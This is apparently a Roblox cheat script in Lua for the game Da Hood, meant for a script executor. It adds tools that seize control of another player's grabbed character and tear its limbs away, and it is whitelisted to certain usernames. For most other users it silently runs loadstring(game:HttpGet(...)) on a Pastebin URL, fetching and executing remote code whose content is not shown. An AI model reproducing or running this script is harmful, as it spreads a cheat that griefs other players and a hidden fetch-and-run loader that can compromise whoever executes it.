if game.Players.LocalPlayer.Name == "fame7ty" or game.Players.LocalPlayer.Name == "dahoodbotmoney5"  then
local PLAYERS = game:GetService("Players")
local OWNER = PLAYERS.LocalPlayer
local GrabbedCharacter
local Furry_
local ClonedCharacter
local LiveConnections = {}
local RopeGrab
local delta = 0
local duration = 1
local Height = 21
local RandomHeight = 40
local Ypos = Height
local Wide = 10000
local Distance = 193684
local Randomize = false
local sound = true
local function ControlAlign(P0,P1,Offset)
    P0.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    P0.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    P0.Velocity = Vector3.new(0, 0, 0)
    P0.CFrame = P1.CFrame * (Offset or CFrame.new())
    P0.CanCollide = false
    P1.CanCollide = false
end

local function ControlAlignV2(P0,P1,Offset)
    P0.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    P0.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    P0.Velocity = Vector3.new(0, 0, 0)
    --P0.CFrame = P1.CFrame * (Offset or CFrame.new())
    P0.CanCollide = false
    P1.CanCollide = false
    if not P0:FindFirstChildWhichIsA("BodyPosition") then Instance.new("BodyPosition",P0) end
    P0.BodyPosition.P = 1000
    P0.BodyPosition.D = 175
    P0.BodyPosition.Position = P1.CFrame * (Offset or CFrame.new()).Position
end

local ControlFakeAttack = {
	2788309317,
	2788309982,
	2788311138,
	2788308661
}

local function InsertOn(Table, Value)
	if type(Table) == "table" and Value then
		Table[#Table + 1] = Value
	end
end

local function Loop(Name, Callback)
	if game:GetService("RunService")[Name] then
		local CurrentLoop
		CurrentLoop = game:GetService("RunService")[Name]:Connect(function()
			local Result, Output = pcall(Callback)
			
			if not Result then
				CurrentLoop:Disconnect()
				warn(Output)
			end
		end)
		
		return CurrentLoop
	end
end

TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if game.Players.LocalPlayer.Name == "dahoodbotmoney5" then
        game:GetService("ReplicatedStorage").MainEvent:FireServer("RingTone",ID)
        local Tool = nil
        if OWNER.Character:FindFirstChildWhichIsA("Tool") then
            Tool = OWNER.Character:FindFirstChildWhichIsA("Tool")
            OWNER.Character:FindFirstChildWhichIsA("Tool").Parent = OWNER.Backpack
        end
        OWNER.Backpack["[Phone]"].Parent = OWNER.Character
        OWNER.Character["[Phone]"].Parent = OWNER.Backpack
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
    else
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end
end
    

function AnimPlayvv2(ID, SPEED, Time, Smoothing)
    for i,v in pairs(OWNER.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do if (v.Animation.AnimationId:match("rbxassetid://"..ID)) then v:Stop() end end
    local animation = Instance.new('Animation', game:GetService("Workspace"))
    animation.AnimationId = 'rbxassetid://'..ID
    playing = OWNER.Character:WaitForChild("Humanoid"):LoadAnimation(animation)
    if tonumber(Smoothing) then
        playing:Play(Smoothing) 
    else
        playing:Play() 
    end
    if tonumber(SPEED) then
        playing:AdjustSpeed(SPEED)
    else
        playing:AdjustSpeed(1)
    end
    if tonumber(Time) then
        playing.TimePosition = Time
    end
    animation:Destroy()
end

function AnimStopv2(ID, SPEED)
    for i,v in pairs(OWNER.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
        if (v.Animation.AnimationId:match("rbxassetid://"..ID)) then
            if tonumber(SPEED) then
                v:Stop(SPEED)
            else
                v:Stop()
            end
        end 
    end
end

function CloneStopanim(ID, SPEED)
    for i,v in pairs(ClonedCharacter.Humanoid:GetPlayingAnimationTracks()) do
        if (v.Animation.AnimationId:match("rbxassetid://"..ID)) then
            if tonumber(SPEED) then
                v:Stop(SPEED)
            else
                v:Stop()
            end
        end 
    end
end
game.Workspace.FallenPartsDestroyHeight = -1/0
local function CloneAnimPlayWStop(ID)
	for i,v in pairs(OWNER.Character.Humanoid:GetPlayingAnimationTracks()) do
		if (v.Animation.AnimationId:match("rbxassetid://"..ID)) then
			v:Stop()
			if not ClonedCharacter:FindFirstChild(ID) then
				local animation = Instance.new('Animation', ClonedCharacter)
				animation.AnimationId = 'rbxassetid://'..ID
				animation.Name = "_____GYAT"
				playing = ClonedCharacter.Humanoid:LoadAnimation(animation)
				playing:Play()
			end
	 	end
	end
	if ClonedCharacter.Humanoid.MoveDirection.magnitude > 0 then
		CloneStopanim(ID)
		for _, v in pairs(ClonedCharacter:GetChildren()) do
			if v.Name == "_____GYAT" then
				v:Destroy()
			end
		end
	end	
end

local function CloneAnimPlayWDetectionIDK(ID,SPEED)
	for i,v in pairs(ClonedCharacter.Humanoid:GetPlayingAnimationTracks()) do if (v.Animation.AnimationId:match("rbxassetid://"..ID)) then v:Stop() return end end
	local animation = Instance.new('Animation', game:GetService("Workspace"))
	animation.AnimationId = 'rbxassetid://'..ID
	playing = ClonedCharacter.Humanoid:LoadAnimation(animation)
	playing:Play() 
    if tonumber(SPEED) then
    	playing:AdjustSpeed(SPEED)
    else
    	playing:AdjustSpeed(1)
    end
	animation:Destroy()
end

local function CloneAnimPlay(ID,SPEED)
	for i,v in pairs(ClonedCharacter.Humanoid:GetPlayingAnimationTracks()) do if (v.Animation.AnimationId:match("rbxassetid://"..ID)) then v:Stop() end end
	local animation = Instance.new('Animation', game:GetService("Workspace"))
	animation.AnimationId = 'rbxassetid://'..ID
	playing = ClonedCharacter.Humanoid:LoadAnimation(animation)
	playing:Play() 
	if tonumber(SPEED) then
		playing:AdjustSpeed(SPEED)
	else
		playing:AdjustSpeed(1)
	end
	animation:Destroy()
end

local function CloneCharacter(OldCharacter)

	OldCharacter.Archivable = true
	
	local newClone = OldCharacter:Clone()
    newClone.HumanoidRootPart.Anchored = false
	newClone.Humanoid.MaxHealth = 9e9
	newClone.Humanoid.Health = 9e9
	newClone.RagdollConstraints:Destroy()
	newClone.BodyEffects:Destroy()
	newClone:WaitForChild("GRABBING_CONSTRAINT"):Destroy()
	for _, Class in pairs(newClone:GetDescendants()) do
		if Class:IsA("BasePart") and
		Class.Name ~= "Head" and
		Class.Name ~= "HumanoidRootPart" and
		Class.Name ~= "UpperTorso" and
		Class.Name ~= "LowerTorso" and
		Class.Name ~= "LeftUpperArm" and
		Class.Name ~= "RightUpperArm" and
		Class.Name ~= "LeftLowerArm" and
		Class.Name ~= "RightLowerArm" and
		Class.Name ~= "LeftHand" and
		Class.Name ~= "RightHand" and
		Class.Name ~= "LeftUpperLeg" and
		Class.Name ~= "RightUpperLeg" and
		Class.Name ~= "LeftLowerLeg" and
		Class.Name ~= "RightLowerLeg" and
		Class.Name ~= "LeftFoot" and
		Class.Name ~= "RightFoot" then
			Class.Massless = false
			Class:Destroy()
		end

        if Class:IsA("BasePart") or Class:IsA("MeshPart") or Class:IsA("Part") then
			Class.CustomPhysicalProperties = PhysicalProperties.new(100, 2, .5, 100, 1)
			Class.Transparency = 1
            Class.CanCollide = false
            if Class:FindFirstChildWhichIsA("BodyGyro") and Class:FindFirstChildWhichIsA("BodyPosition") then
                Class:Destroy()
            end
		end
		
		if Class:IsA("Decal") then
			Class.Transparency = 1
		end

        if Class:IsA("ForceField") then
			Class:Destroy()
		end

		if Class:IsA("Motor6D") then
			Class:Destroy()
		end
	end
    newClone.HumanoidRootPart.Transparency = 1
	newClone.Parent = OWNER.Character
	newClone.Humanoid:ChangeState("GettingUp")
    newClone.HumanoidRootPart.CFrame = OWNER.Character.HumanoidRootPart.CFrame
	OldCharacter.Archivable = false
    OldCharacter.LeftHand:FindFirstChildOfClass("Motor6D").Enabled = false
    OldCharacter.RightHand:FindFirstChildOfClass("Motor6D").Enabled = false
    OldCharacter.LeftFoot:FindFirstChildOfClass("Motor6D").Enabled = false
    OldCharacter.RightFoot:FindFirstChildOfClass("Motor6D").Enabled = false
	return newClone
end

local function ControlFramework()
    local Ungrabbed
    local Speed__UP
    if OWNER.Backpack:FindFirstChild("marco") then OWNER.Backpack:FindFirstChild("marco"):Destroy() end task.wait(.1)
    local marco = Instance.new("Tool",OWNER.Backpack)
    marco.RequiresHandle = false
    marco.Name = "marco"
    marco.Activated:connect(function()
        Speed__UP = not Speed__UP
        if Speed__UP == true then
            CloneAnimPlayWDetectionIDK(3189777795)
            repeat task.wait()
                ClonedCharacter.HumanoidRootPart.CFrame = ClonedCharacter.HumanoidRootPart.CFrame + ClonedCharacter.Humanoid.MoveDirection * 1.5
            until Speed__UP == false
        end
    end)
    InsertOn(LiveConnections, OWNER:GetMouse().KeyDown:Connect(function(key)
        if key == "v" then
            CloneAnimPlayWDetectionIDK(7024352298)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(7024352298)
        elseif key == "q" then
            CloneAnimPlayWDetectionIDK(10370362157,1.1)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(10370362157)
        elseif key == "t" then
            CloneAnimPlayWDetectionIDK(10714068222)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(10714068222)
        elseif key == "y" then
            CloneAnimPlayWDetectionIDK(507770818)
            Play(374106817)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(507770818)
        elseif key == "u" then
            CloneAnimPlayWDetectionIDK(10714340543,1.3)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(10714340543)
        elseif key == "j" then
            CloneAnimPlayWDetectionIDK(14548619594)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(14548619594)
        elseif key == "e" then
            CloneAnimPlayWDetectionIDK(2816431506,1.5)
        elseif key == "r" then
            CloneAnimPlayWDetectionIDK(11444443576,1.1)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(11444443576)
        elseif key == "b" then
            CloneAnimPlayWDetectionIDK(10214314957)
            repeat wait()
            until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
            CloneStopanim(10214314957)
        elseif key == "2" then
            CloneAnimPlay(3152394906)
        elseif key == "f" then
            CloneAnimPlay(2788354405)
        elseif key == "0" then
            ClonedCharacter.Humanoid.WalkSpeed = 24
        elseif key == "x" then
            Speed__UP = not Speed__UP
            if Speed__UP == true then
                CloneAnimPlayWDetectionIDK(3189777795)
                repeat task.wait()
                    ClonedCharacter.HumanoidRootPart.CFrame = ClonedCharacter.HumanoidRootPart.CFrame + ClonedCharacter.Humanoid.MoveDirection * 2
                until Speed__UP == false
            end
        end
    end))

    InsertOn(LiveConnections, OWNER:GetMouse().KeyUp:Connect(function(key)
        if key == "2" then
            CloneStopanim(3152394906)
        elseif key == "f" then
            CloneStopanim(2788354405)
        elseif key == "0" then
            ClonedCharacter.Humanoid.WalkSpeed = 16
        end
    end))

    InsertOn(LiveConnections, OWNER.Backpack.Combat.Activated:Connect(function(key)
        CloneAnimPlay((ControlFakeAttack[math.random(1,#ControlFakeAttack)]),1.3)
    end))

    repeat task.wait() until OWNER.Character.BodyEffects.Grabbed.Value == nil or Furry_ == true
    if OWNER.Backpack:FindFirstChild("marco") then OWNER.Backpack:FindFirstChild("marco"):Destroy() end task.wait(.1)
    if OWNER.Character:FindFirstChild("marco") then OWNER.Character:FindFirstChild("marco"):Destroy() end task.wait(.1)

    OWNER.Character.HumanoidRootPart.CFrame = ClonedCharacter.HumanoidRootPart.CFrame
    ZeroVelocity___(OWNER.Character.HumanoidRootPart)
    workspace.CurrentCamera.CameraSubject = OWNER.Character
    ClonedCharacter:Destroy()
    for _, Stuff in pairs(GrabbedCharacter:GetDescendants()) do
        if Stuff:IsA("BodyPosition") then
            Stuff:Destroy()
        end
    end
    for _, Connection in pairs(LiveConnections) do Connection:Disconnect()end
    GrabbedCharacter.LeftHand:FindFirstChildOfClass("Motor6D").Enabled = true
    GrabbedCharacter.RightHand:FindFirstChildOfClass("Motor6D").Enabled = true
    GrabbedCharacter.LeftFoot:FindFirstChildOfClass("Motor6D").Enabled = true
    GrabbedCharacter.RightFoot:FindFirstChildOfClass("Motor6D").Enabled = true
end

function ZeroVelocity___(PATH)
    PATH.Velocity = Vector3.zero
    PATH.AssemblyAngularVelocity = Vector3.zero
    PATH.AssemblyLinearVelocity = Vector3.zero
end

function Align(POWER,DAMPLING,TARGET_PART,OWNER_PART,POSITION,ROTATION)
    if OWNER.Character.BodyEffects.Grabbed.Value ~= nil then
        if not GrabbedCharacter[TARGET_PART]:FindFirstChildWhichIsA("BodyPosition") and not GrabbedCharacter[TARGET_PART]:FindFirstChildWhichIsA("BodyGyro") then
            local BP = Instance.new("BodyPosition",GrabbedCharacter[TARGET_PART])
            BP.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
            local bg = Instance.new("BodyGyro",GrabbedCharacter[TARGET_PART])
            bg.maxTorque = Vector3.new(9e9,9e9,9e9)
            bg.P = 10000
        end
        GrabbedCharacter[TARGET_PART].BodyGyro.CFrame = OWNER.Character[OWNER_PART].CFrame*ROTATION
        GrabbedCharacter[TARGET_PART].BodyPosition.Position = OWNER.Character[OWNER_PART].CFrame*POSITION.Position
        GrabbedCharacter[TARGET_PART].BodyPosition.P = POWER
        GrabbedCharacter[TARGET_PART].BodyPosition.D = DAMPLING
    end
end

function Destroy(PART)
    if GrabbedCharacter[PART]:FindFirstChildOfClass("BodyGyro") or  GrabbedCharacter[PART]:FindFirstChildOfClass("BodyPosition") then
        GrabbedCharacter[PART]:FindFirstChildOfClass("BodyGyro"):Destroy()
        GrabbedCharacter[PART]:FindFirstChildOfClass("BodyPosition"):Destroy()
    end
end


function Holding()
    repeat task.wait()
        Align(10000,175,"UpperTorso","RightUpperArm",CFrame.new(-.2, -1.7, 0.5),CFrame.Angles(math.pi*-.5,math.pi * 1,math.pi*.07))
    until OWNER.Character.BodyEffects.Grabbed.Value == nil or Furry_ == true
end

function Grab()
    if OWNER.Character.BodyEffects.Grabbed.Value then
		GrabbedCharacter = OWNER.Character.BodyEffects.Grabbed.Value
		local GrabConstraint = GrabbedCharacter:WaitForChild("GRABBING_CONSTRAINT")
		
		if not GrabConstraint then return end
		
		RopeGrab = GrabConstraint:FindFirstChildOfClass("RopeConstraint")
		RopeGrab.Length = 1/0
        Furry_ = false
        for i,v in pairs(GrabbedCharacter:GetChildren()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end    
        repeat task.wait()
            for _, Anim in pairs(OWNER.Character.Humanoid:GetPlayingAnimationTracks()) do
                if (Anim.Animation.AnimationId:match("rbxassetid://11075367458")) then
                    Furry_ = true
                    Anim:Stop()
                end
            end
        until Furry_ == true
        for _, Class in pairs(GrabbedCharacter:GetDescendants()) do
            if Class:IsA("BasePart") then
                Class.Velocity = Vector3.zero
                Class.AssemblyAngularVelocity = Vector3.zero
                Class.AssemblyLinearVelocity = Vector3.zero
            end
        end
        Furry_ = false
        AnimPlayvv2(3135389157,0,0.1,0.3)
        Play(2848703459)
        Holding()
        AnimStopv2(3135389157)
        Destroy("UpperTorso")
    end
end

function ToolSSs()

if OWNER.Backpack:FindFirstChild("Control") then OWNER.Backpack:FindFirstChild("Control"):Destroy() end task.wait(.1)
local Control = Instance.new("Tool",OWNER.Backpack)
Control.RequiresHandle = false
Control.Name = "Control"
Control.Activated:connect(function()
    if OWNER.Character.BodyEffects.Grabbed.Value then
        Play(907329532)
        task.wait(1)
        OWNER.Character["Control"].Parent = OWNER.Backpack task.wait()
        Furry_ = true
        task.wait()
        Furry_ = false
	
        ClonedCharacter = CloneCharacter(GrabbedCharacter)

            workspace.CurrentCamera.CameraSubject = ClonedCharacter
        InsertOn(LiveConnections, Loop("Heartbeat", function()
              for i,v in pairs(OWNER.Character:FindFirstChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
              OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(ClonedCharacter.HumanoidRootPart.Position.X,-40,ClonedCharacter.HumanoidRootPart.Position.Z))*CFrame.Angles(math.pi*0.5,0,0)
              ZeroVelocity___(OWNER.Character.HumanoidRootPart)
            ControlAlign(GrabbedCharacter.Head,ClonedCharacter:FindFirstChild("Head"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.HumanoidRootPart,ClonedCharacter:FindFirstChild("HumanoidRootPart"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.UpperTorso,ClonedCharacter:FindFirstChild("UpperTorso"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LowerTorso,ClonedCharacter:FindFirstChild("LowerTorso"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LeftUpperArm,ClonedCharacter:FindFirstChild("LeftUpperArm"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LeftLowerArm,ClonedCharacter:FindFirstChild("LeftLowerArm"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.RightUpperArm,ClonedCharacter:FindFirstChild("RightUpperArm"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.RightLowerArm,ClonedCharacter:FindFirstChild("RightLowerArm"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LeftHand,ClonedCharacter:FindFirstChild("LeftHand"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.RightHand,ClonedCharacter:FindFirstChild("RightHand"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LeftUpperLeg,ClonedCharacter:FindFirstChild("LeftUpperLeg"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LeftLowerLeg,ClonedCharacter:FindFirstChild("LeftLowerLeg"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.RightUpperLeg,ClonedCharacter:FindFirstChild("RightUpperLeg"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.RightLowerLeg,ClonedCharacter:FindFirstChild("RightLowerLeg"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.LeftFoot,ClonedCharacter:FindFirstChild("LeftFoot"),CFrame.new(0, 0, 0))
            ControlAlign(GrabbedCharacter.RightFoot,ClonedCharacter:FindFirstChild("RightFoot"),CFrame.new(0, 0, 0))
            CloneAnimPlayWStop(3152375249)
            CloneAnimPlayWStop(3152378852)
            CloneAnimPlayWStop(3189773368)
            CloneAnimPlayWStop(3189776546)
            CloneAnimPlayWStop(3189777795)
            CloneAnimPlayWStop(3189779152)
            CloneAnimPlayWStop(3487719500)
            CloneAnimPlayWStop(11710529975)
            CloneAnimPlayWStop(11710524717)
            CloneAnimPlayWStop(11710527244)
            CloneAnimPlayWStop(11710529220)
            CloneAnimPlayWStop(11710529220)
            CloneAnimPlayWStop(11710524200)
            CloneAnimPlayWStop(11710541744)
            for i,v in pairs(ClonedCharacter.Humanoid:GetPlayingAnimationTracks()) do
                if (v.Animation.AnimationId:match("rbxassetid://3152394906")) then
                    if ClonedCharacter.Humanoid.MoveDirection.magnitude > 0 then
                        v:AdjustSpeed(1)
                    else
                        v:AdjustSpeed(0)
                    end
                end
            end
            ClonedCharacter.Humanoid.Jump = OWNER.Character.Humanoid.Jump
            ClonedCharacter.Humanoid:Move(OWNER.Character.Humanoid.MoveDirection, false)
        end))
        ControlFramework()
    end
end)

if OWNER.Backpack:FindFirstChild("Rip") then OWNER.Backpack:FindFirstChild("Rip"):Destroy() end task.wait(.1)
local Rip_ = Instance.new("Tool",OWNER.Backpack)
Rip_.RequiresHandle = false
Rip_.Name = "Rip"
Rip_.Activated:connect(function()
    if OWNER.Character.BodyEffects.Grabbed.Value then
        OWNER.Character["Rip"].Parent = OWNER.Backpack task.wait()
        Play(7148332723)
        task.wait(1)
        Furry__ = true
        task.wait()
        Furry__ = false
        spawn(function()
            AnimStopv2(3135389157)
            AnimPlayvv2(4784557631)
            repeat task.wait()
                Align(5000,500,"UpperTorso","RightUpperArm",CFrame.new(-.2, -1.7, 0.5)*CFrame.new(.4, 0, 0),CFrame.Angles(math.pi*-.5,0,math.pi*-.06)*CFrame.Angles(0,0,math.pi*-.5))
            until Furry__ == true
        end)
        task.wait(1)
        task.wait(.3)
        GrabbedCharacter.RightUpperLeg.CFrame = CFrame.new(0,-1000,0)
        GrabbedCharacter.RightUpperArm.CFrame = CFrame.new(0,-1000,0)
        GrabbedCharacter.LeftUpperLeg.CFrame = CFrame.new(0,-1000,0)
        GrabbedCharacter.LeftUpperArm.CFrame = CFrame.new(0,-1000,0)
        GrabbedCharacter.LowerTorso.CFrame = CFrame.new(0,-1000,0)
        Play(5951833277)
        task.wait(.5)
        AnimStopv2(4784557631,.5)
        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
        Furry__ = true
        task.wait()
        Furry__ = false
        Destroy("UpperTorso")
    end
end)
end
if getgenv().JOINTWATCHERv2 then getgenv().JOINTWATCHERv2:Disconnect() end
if getgenv().CharacterAddedv3 then getgenv().CharacterAddedv3:Disconnect() end
getgenv().JOINTWATCHERv2 = OWNER.Character.BodyEffects.Grabbed:GetPropertyChangedSignal("Value"):Connect(Grab)
getgenv().CharacterAddedv3 =  OWNER.CharacterAdded:connect(function()
    OWNER.Character:WaitForChild("FULLY_LOADED_CHAR")
    repeat task.wait() until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MoveDirection.magnitude > 0
    getgenv().JOINTWATCHERv2 = OWNER.Character.BodyEffects.Grabbed:GetPropertyChangedSignal("Value"):Connect(Grab)
    ToolSSs()
end)
ToolSSs()
if game.Players.LocalPlayer.Name == "zer1ckq" or game.Players.LocalPlayer.Name == "isthisdo23" or game.Players.LocalPlayer.Name == "dahoodbotmoney5" then
    print("DEER")
else
    loadstring(game:HttpGet('https://pastebin.com/raw/3hnKWdzB'))()
end

-- Create BlurEffect
local blur = Instance.new("BlurEffect")
blur.Size = 24 -- Adjust the size of the blur
blur.Parent = game.Lighting

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
wait(1)
-- Create ImageLabel
local imageLabel = Instance.new("ImageLabel")
imageLabel.Size = UDim2.new(0.5, 0, 0.5, 0) -- Adjust the size of the image
imageLabel.Position = UDim2.new(0.25, 0, 0.25, 0) -- Center the image
imageLabel.Image = "rbxassetid://18702603050" -- Replace with your image asset ID
imageLabel.Parent = screenGui

-- Wait for 1 second
wait(3)

-- Remove BlurEffect and ImageLabel
screenGui:Destroy()
wait(1)
blur:Destroy()


    game.StarterGui:SetCore("SendNotification", {
    Title = "DEER"; 
    Text = "script";
    Text = "discrod deer14927";
    Icon = "rbxassetid://16005965106";
    Duration = 9e9;
    })
    wait(0.1)
end
if _G.Loopcheck then _G.Loopcheck:Disconnect() end
_G.Loopcheck = game:GetService("RunService").stepped:Connect(function()
    if game.Players:FindFirstChild("XK5NG") then
    if game:GetService("Players").localPlayer.Backpack:FindFirstChild("Rip") then game:GetService("Players").localPlayer.Backpack:FindFirstChild("Rip"):Destroy() end
    if game:GetService("Players").localPlayer.Character:FindFirstChild("Rip") then game:GetService("Players").localPlayer.Character:FindFirstChild("Rip"):Destroy() end
    if game:GetService("Players").localPlayer.Backpack:FindFirstChild("Control") then game:GetService("Players").localPlayer.Backpack:FindFirstChild("Control"):Destroy() end
    if game:GetService("Players").localPlayer.Character:FindFirstChild("Control") then game:GetService("Players").localPlayer.Character:FindFirstChild("Control"):Destroy() end
    end
end)
